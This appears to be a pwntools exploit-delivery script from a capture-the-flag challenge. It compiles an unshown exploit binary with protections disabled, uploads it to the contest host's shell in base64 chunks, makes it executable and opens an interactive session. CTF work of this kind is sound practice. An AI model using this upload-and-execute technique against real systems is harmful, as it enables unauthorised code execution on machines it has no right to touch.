#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "brainfuck64-01.pwn.beer"
PORT =  31337

PROMPT = "$ "

def compile():
    log.info("Compile")
    os.system("musl-gcc -w -s -static -o3 pwn.c -o pwn -fno-stack-protector -zexecstack -masm=intel")

def upload():
    r.sendline("cd")
    r.recvuntil(PROMPT)
    
    p = log.progress("Upload")

    with open("pwn", "rb") as f:
        data = f.read()

    encoded = base64.b64encode(data)

    for i in range(0, len(encoded), 300):
        p.status("%d / %d" % (i, len(encoded)))
        r.sendline("echo %s >> benc" % (encoded[i:i+300]))
        r.recvuntil(PROMPT)

    r.sendline("cat benc | base64 -d > bout")
    r.recvuntil(PROMPT)
    r.sendline("chmod +x bout")
    r.recvuntil(PROMPT)
    p.success()

def exploit(r):
    compile()

    log.info("Booting")
    r.recvuntil(PROMPT)

    upload()

    r.interactive()
    
    return

if __name__ == "__main__":
    if len(sys.argv) > 1:
        r = remote(HOST, PORT)
        exploit(r)        
    else:
        LOCAL = True
        
        r = process(["./run.sh"])
        
        print util.proc.pidof(r)
        pause()
        exploit(r)
